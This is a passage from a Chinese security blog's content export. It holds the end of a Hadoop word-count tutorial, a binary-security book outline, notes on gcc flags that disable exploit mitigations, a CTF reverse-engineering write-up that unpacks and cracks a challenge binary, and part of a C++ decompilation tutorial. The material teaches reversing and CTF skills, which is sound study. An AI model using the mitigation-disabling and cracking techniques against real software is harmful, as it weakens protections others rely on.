<span class="number">0</span>;</span><br><span class="line">            IntWritable val;</span><br><span class="line">            <span class="keyword">for</span>(Iterator i$ = values.iterator(); i$.hasNext(); sum += val.get()) &#123;</span><br><span class="line">                val = (IntWritable)i$.next();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.result.set(sum);</span><br><span class="line">            context.write(key, <span class="keyword">this</span>.result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>选择File-&gt;Export-&gt;一系列next，最后要选择Main_Class</p><p><img src="https://i.loli.net/2019/11/11/Eq6wkSRNZvcbs5A.png" alt="20191025211017021_1663740123"><br>导出jar后，scp传上去</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp wordCounter.jar hadoop@192.168.150.133:/usr/<span class="built_in">local</span>/hadoop</span><br></pre></td></tr></table></figure><p>启动hadoop</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./sbin/start-all.sh</span><br></pre></td></tr></table></figure><p>创建文件夹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -mkdir /<span class="built_in">test</span>/input</span><br><span class="line">./bin/hdfs dfs -mkdir /<span class="built_in">test</span>/output</span><br></pre></td></tr></table></figure><p>移动文件到目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -mv 你的单词文件 /<span class="built_in">test</span>/input</span><br></pre></td></tr></table></figure><p>可以看到目录下有wordCounter.jar</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hadoop@dblab-VirtualBox:/usr/<span class="built_in">local</span>/hadoop$ ls</span><br><span class="line">bin  etc  include  lib  libexec  LICENSE.txt  logs  NOTICE.txt  README.txt  sbin  share  tmp  wordCounter.jar  word.txt</span><br></pre></td></tr></table></figure><p>执行hadoop</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/hadoop jar wordCounter.jar <span class="string">'/test/input'</span> <span class="string">'/test/ouput'</span></span><br></pre></td></tr></table></figure><p>查看结果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -cat /<span class="built_in">test</span>/ouput/part-r-00000</span><br><span class="line">game	1</span><br><span class="line">hadoop	2</span><br><span class="line">i	5</span><br><span class="line">love	5</span><br><span class="line">mapreduce	2</span><br><span class="line">this	1</span><br></pre></td></tr></table></figure><h1 id="自行配置eclipse自动补全"><a href="#自行配置eclipse自动补全" class="headerlink" title="自行配置eclipse自动补全"></a>自行配置eclipse自动补全</h1><p><img src="https://i.loli.net/2019/11/11/LqOUjGFK8nheYcD.png" alt="20191025214212938_984636996"></p><p>配置自动补全</p><p>.abcdefghijklmnopqrstuvwxyz(,</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/c690256a/">https://noone-hub.github.io/posts/c690256a/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>作业</category>
      </categories>
      <tags>
        <tag>大数据，作业</tag>
      </tags>
  </entry>
  <entry>
    <title>书籍文章目录</title>
    <url>/posts/18d025c7/</url>
    <content><![CDATA[<p>第一节：二进制安全概述<br>第二节：基础知识<br>2.1 什么是软件<br>2.2 什么是恶意软件<br>2.2.1 潜藏广告<br>2.2.2 木马<br>2.2.3 病毒<br>2.2.4 后门软件<br>2.3 什么是漏洞<br>2.3.1 poc是什么<br>2.3.2 exp是什么<br>2.4 虚拟环境<br>2.4.1 沙盒<br>2.4.2 虚拟机<br>2.5 分析手法<br>2.5.1 静态分析<br>2.5.2 动态分析<br>第三节：二进制安全应用<br>3.1 二进制层面的攻击<br>3.1.1 软件的破解<br>3.1.2 制作二进制层面的恶意软件<br>3.1.3 利用软件漏洞攻击<br>3.2 二进制层面的防御<br>3.2.1 软件的安全防护<br>3.2.1 恶意软件的防护<br>3.2.1 软件漏洞的预防<br>第四节： 常见安全场景<br>4.1 windows安全<br>4.2 移动安全<br>4.2.1 安卓安全<br>4.2.2 ios安全<br>第五节： 二进制层面的安全防护<br>5.1 基础级别防护<br>5.1.1 安装杀毒软件<br>5.1.2 下载方式的选择<br>5.1.3 未知软件的处理<br>5.2 进阶防护<br>5.2.1 利用工具分析未知软件<br>5.2.2 根据行为判别软件类别<br>5.2.3 虚拟环境洞察软件行为<br>5.2.4 应对处理措施</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/18d025c7/">https://noone-hub.github.io/posts/18d025c7/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>书籍目录</tag>
      </tags>
  </entry>
  <entry>
    <title>基础待补充</title>
    <url>/posts/fc164dcc/</url>
    <content><![CDATA[<h1 id="base"><a href="#base" class="headerlink" title="base"></a>base</h1><h2 id="python负数转16进制"><a href="#python负数转16进制" class="headerlink" title="python负数转16进制"></a>python负数转16进制</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">-1</span> &amp; <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="string">'0xffffffff'</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pack(<span class="number">-1</span>,<span class="number">32</span>,<span class="string">'little'</span>,<span class="literal">True</span>)</span><br><span class="line"><span class="string">'\xff\xff\xff\xff'</span></span><br></pre></td></tr></table></figure><h2 id="mmap-prot参数"><a href="#mmap-prot参数" class="headerlink" title="mmap prot参数"></a>mmap prot参数</h2><table><thead><tr><th>可执行(x)</th><th>可写(w)</th><th>可读(r)</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td></tr></tbody></table><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h2><p>sudo route add -net 192.25.0.0 netmask 255.255.0.0 gw 192.168.0.134</p><p>网关是目的ip，转发目的地<br>192.25.0.0 加netmask 255.255.0.0是</p><h2 id="gcc编译"><a href="#gcc编译" class="headerlink" title="gcc编译"></a>gcc编译</h2><p>PIE/ASLR：-no-pie|-pie（这里细节多，暂时忽略）</p><p>Canary：-fno-stack-protector（禁用）|-fstack-protector（部分）|-fstack-protector-all（完全）|-fstack-protector-strong</p><p>NX/DEP：-z execstack（禁用）|-z noexecstack（开启）</p><p>Fortity：-D_FORTIFY_SOURCE=1（编译弱检查）|-D_FORTIFY_SOURCE=2（强检查终止）</p><p>RELRO：-z norelro（禁用）|-z lazy（部分）|-z now（完全）</p><h2 id="谷歌浏览器端口黑名单"><a href="#谷歌浏览器端口黑名单" class="headerlink" title="谷歌浏览器端口黑名单"></a>谷歌浏览器端口黑名单</h2><p>1, // tcpmux<br>7, // echo<br>9, // discard<br>11, // systat<br>13, // daytime<br>15, // netstat<br>17, // qotd<br>19, // chargen<br>20, // ftp data<br>21, // ftp access<br>22, // ssh<br>23, // telnet<br>25, // smtp<br>37, // time<br>42, // name<br>43, // nicname<br>53, // domain<br>77, // priv-rjs<br>79, // finger<br>87, // ttylink<br>95, // supdup<br>101, // hostriame<br>102, // iso-tsap<br>103, // gppitnp<br>104, // acr-nema<br>109, // pop2<br>110, // pop3<br>111, // sunrpc<br>113, // auth<br>115, // sftp<br>117, // uucp-path<br>119, // nntp<br>123, // NTP<br>135, // loc-srv /epmap<br>139, // netbios<br>143, // imap2<br>179, // BGP<br>389, // ldap<br>465, // smtp+ssl<br>512, // print / exec<br>513, // login<br>514, // shell<br>515, // printer<br>526, // tempo<br>530, // courier<br>531, // chat<br>532, // netnews<br>540, // uucp<br>556, // remotefs<br>563, // nntp+ssl<br>587, // stmp?<br>601, // ??<br>636, // ldap+ssl<br>993, // ldap+ssl<br>995, // pop3+ssl<br>2049, // nfs<br>3659, // apple-sasl / PasswordServer<br>4045, // lockd<br>6000, // X11<br>6665, // Alternate IRC [Apple addition]<br>6666, // Alternate IRC [Apple addition]<br>6667, // Standard IRC [Apple addition]<br>6668, // Alternate IRC [Apple addition]<br>6669, // Alternate IRC [Apple addition]</p><h2 id="64位scanf-patch"><a href="#64位scanf-patch" class="headerlink" title="64位scanf patch"></a>64位scanf patch</h2><p>push 73303125h<br>mov rdi, rsp<br>add rsp, 8<br>将lea rdi, 全局变量改成</p><h2><a href="#" class="headerlink"></a></h2><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/fc164dcc/">https://noone-hub.github.io/posts/fc164dcc/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>滴滴ctf_re1,2</title>
    <url>/posts/a657c435/</url>
    <content><![CDATA[<h1 id="DDCTF之re1详解"><a href="#DDCTF之re1详解" class="headerlink" title="DDCTF之re1详解"></a>DDCTF之re1详解</h1><p>前言：re1,可能我的是非预期解法吧，re2的话，可能也是非预期吧，不过做出来过后感觉这两道都蛮简单的，不会做的时候就是个傻子。。。</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>用ida打开这个程序，出现upx1,明显upx壳，linux下我用upx -d filename 脱了壳后。我先把ida出来的flag复制提交了下，没用。。。然后开始看算法，</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-804h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5h] [ebp-803h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+404h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+405h] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please input code:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v6);</span><br><span class="line">  sub_401000(&amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v4, <span class="string">"DDCTF&#123;reverseME&#125;"</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You've got it!!%s\n"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Try again later.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个过程很明朗，没有挖坑，关键函数就在sub_401000处，进去后</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a1 - v1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v1 = byte_402FF8[(<span class="keyword">char</span>)v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 &lt; result );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>…我发觉a1 - v1这是什么鬼，a1不是地址吗，v1又是什么鬼。。抱着一堆什么鬼都不知道的东西，我就直接上od了，因为这是windows逆向，所以我还是比较擅长动态调试的，大一一年几乎都是在啃汇编啃od,当时都不知道ida这玩意。</p><p>调试环境：吾爱虚拟机</p><p>工具：吾爱的OD</p><p>感觉像是为吾爱打了一波广告，哈哈，没关系，反正我也是论坛成员，宣传下没什么毛病<br>打开od载入程序后，点播放按钮，也就是运行按钮，然后右键中文搜索，搜索字符串，来到这里</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blu5vzhij319y0jgmxw.jpg" alt="2"></p><p>在定位到关键点please input code<br>这里很容易看出ida的逻辑，scanf后跟着的一个call便是关键，在此call处下断点，</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blucw5inj31hc0sj77u.jpg" alt="3"></p><p>然后输入12345678,</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blui7pb2j31hc0sj77t.jpg" alt="4"></p><p>成功断下，然后F7单步进入,在单步跟了一轮过后，我发觉pop这里有好东西<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blunfdy7j31hc0sjtc5.jpg" alt="6"><br>看堆栈窗口，也就是右下角，出现了跟我输入字符串一样长度的英文字符串，起初我也没在意，然后输入多几次后发觉，每次输入是对应的，也就是说，他跟凯撒密码类似，他只是移了下位，然后，我自己手动把键盘里所有出现的字符输入了一遍，发觉还是漏了一些，找不齐，最终就利用他本身含有的一个字符串进行输入，得到每个的对应字符串，他的字符串可以从od里直接看到<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2bluu4xyaj31hc0sj77l.jpg" alt="7"><br>或者从ida里都可以找到<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2bluykzzgj30wi04pq3x.jpg" alt="8"><br>然后进行手动输入进行匹配，我需要的DDCTF{reverse}<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blv2f2a7j31hc0sjwi3.jpg" alt="9"><br>看栈窗口，最上面的对应匹配，我这样手动把每个字符对应起来，就得到flag了<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blv7l7y4j31hc0sjwi2.jpg" alt="10"><br>最终得到对应字符<br>Z D<br>[ C<br>J T<br>, r<br>9 e<br>( v</p><ul><li>s<h1><a href="#" class="headerlink" title="{"></a>{</h1>! }<br>X F</li></ul><p>手动得到ZZ[JX#,9(9,+9!</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/a657c435/">https://noone-hub.github.io/posts/a657c435/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>about_me</tag>
      </tags>
  </entry>
  <entry>
    <title>C++_vector_reverse</title>
    <url>/posts/6e2e265a/</url>
    <content><![CDATA[<h1 id="C-逆向之容器vector篇入门（本文首发于安全客）"><a href="#C-逆向之容器vector篇入门（本文首发于安全客）" class="headerlink" title="C++逆向之容器vector篇入门（本文首发于安全客）"></a>C++逆向之容器vector篇入门（本文首发于安全客）</h1><p>前言：说实话，我自己也不会c++的逆向。然后，现在太多的题目是c++的逆向了，一上来就是一堆容器，搞得我不得不去补补c++逆向部分的知识了，我这篇文章以西湖论剑的easyCpp为例，希望能给那些跟我一样是c++逆向的新手的朋友们一点启发。下面我就开始我的抛砖引玉篇幅吧，在这篇文章里，我会以题目中出现的逆向出来的代码以及C++的代码进行对比，让你们更好的知道，c++容器入门篇其实不难，开始正文：</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>我将先给你们介绍每个容器操作的代码以及ida反汇编出来的代码进行对比</p><h2 id="vector的构造以及析构"><a href="#vector的构造以及析构" class="headerlink" title="vector的构造以及析构"></a>vector的构造以及析构</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//声明一个int型向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1;</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//声明一个初始大小为5的int向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test2(<span class="number">5</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明一个初始大小为10且值都是1的向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test3(<span class="number">10</span>,<span class="number">1</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明并用num向量初始化test4向量</span></span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test4(num);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用向量vec的第0个到第9个值初始化test3</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test5(test3.begin(), test3.end());</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将arr[1]~arr[4]范围内的元素作为vec的初始值</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test6(&amp;<span class="built_in">array</span>[<span class="number">1</span>], &amp;<span class="built_in">array</span>[<span class="number">4</span>]);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是C++代码，接下来是ida F5出现的代码</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+20h] [rbp-E0h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+24h] [rbp-DCh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+30h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+40h] [rbp-C0h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+80h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+E2h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+E3h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [rsp+E4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+E9h] [rbp-17h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+EAh] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+EBh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [rsp+ECh] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个vector</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v16, argv, envp);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建初始容量大小为5的vector</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v17);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v15, <span class="number">5L</span>L, &amp;v17);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v17);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建初始容量大小为10并且将元素初始化为1的vector</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v18);</span><br><span class="line">  v19 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v14, <span class="number">10L</span>L, &amp;v19, &amp;v18);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v18);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明并用num向量初始化test4向量</span></span><br><span class="line">  v23 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v20);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v13, v23, &amp;v20);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v20);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v21);</span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v14);</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line">  <span class="comment">//这两句在c++中相当于v14.begin()以及v14.end()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//这句看着很长，其实也就是构造函数，将::提取出来就可以看出std::vector&lt;...&gt;::vector&lt;...&gt;(...)</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="keyword">void</span>&gt;(</span><br><span class="line">    &amp;v12,</span><br><span class="line">    v4,</span><br><span class="line">    v3,</span><br><span class="line">    &amp;v21);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v21);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v7 = <span class="number">1</span>;</span><br><span class="line">  v8 = <span class="number">2</span>;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  v10 = <span class="number">4</span>;</span><br><span class="line">  v11 = <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v22);</span><br><span class="line">  <span class="comment">//将arr[1]~arr[4]范围内的元素作为vec的初始值，v8为数组下标为1的元素，v11为最后一个</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>&lt;<span class="keyword">int</span> *,<span class="keyword">void</span>&gt;(&amp;v6, &amp;v8, &amp;v11, &amp;v22);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v22);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v12);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v13);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v14);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v15);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v16);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ul><li>从代码里可以看出，在ida的识别世界里，他会先创建一个临时变量，然后将他的地址传到vector的构造函数里</li><li>而不同的vector构造函数，只是参数不同，第二个为初始容量，第三个为初始数值的地址，第四个为allocator用于分配内存</li><li>可以看出构造函数和析构函数是同时存在的</li><li>要学会简化所识别出来的C++代码，括号里的模板类可以不仔细看，只需要看他具体是什么函数就行</li></ul><p><strong>重点</strong>：<br>v3 = std::vector&lt;int,std::allocator<int>&gt;::end(&amp;v14);<br>v4 = std::vector&lt;int,std::allocator<int>&gt;::begin(&amp;v14);<br>这两句要会识别，这是常用的，他是取容器的begin和end，相当于C++的v14.begin();v14.end();</int></int></p><h2 id="vector的常用操作识别"><a href="#vector的常用操作识别" class="headerlink" title="vector的常用操作识别"></a>vector的常用操作识别</h2><p>先进行vector操作知识的复习</p><p>vector对象最重要的几种操作</p><ol><li>v.push_back(t) 　　　　在容器的最后添加一个值为t的数据，容器的size变大。</li><li>v.size() 　 返回容器中数据的个数，size返回相应vector类定义的size_type的值。</li><li>v.empty() 　　　　　　判断vector是否为空</li><li>v[n] 或 v.at(n) 